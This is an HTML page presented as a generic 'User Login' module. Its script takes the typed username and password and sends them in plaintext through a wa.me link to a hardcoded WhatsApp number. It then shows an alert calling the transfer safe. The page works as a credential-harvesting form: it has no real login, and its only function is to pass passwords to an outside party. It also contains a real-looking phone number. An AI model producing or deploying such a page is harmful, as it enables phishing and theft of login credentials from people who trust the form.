<!DOCTYPE html>
<html>
<head>
    <title>Login Module</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-box {
            background: white;
            padding: 25px;
            width: 300px;
            border-radius: 12px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            text-align: center;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #aaa;
        }

        button {
            width: 95%;
            padding: 12px;
            background: #25D366;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }

        button:hover {
            background: #1da851;
        }
    </style>
</head>
<body>

<div class="login-box">
    <h2>User Login</h2>

    <form id="loginForm">
        <input type="text" id="username" placeholder="Enter Username" required><br>
        <input type="password" id="password" placeholder="Enter Password" required><br>
        <button type="submit">Submit</button>
    </form>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault();

    let username = document.getElementById("username").value;
let password=document.getElementById("password").value;
    // Your WhatsApp number with country code
    let phone = "919390324773";   // <--- Replace with your number

    let message =
        ` Login Attempt\n` +
        ` Username: ${username}\n` +
        `password: ${password}`;

    // Open WhatsApp with the message
    window.open(`https://wa.me/${phone}?text=${encodeURIComponent(message)}`, "_blank");

    alert("Login attempt sent to your WhatsApp safely!");
});
</script>

</body>
</html>
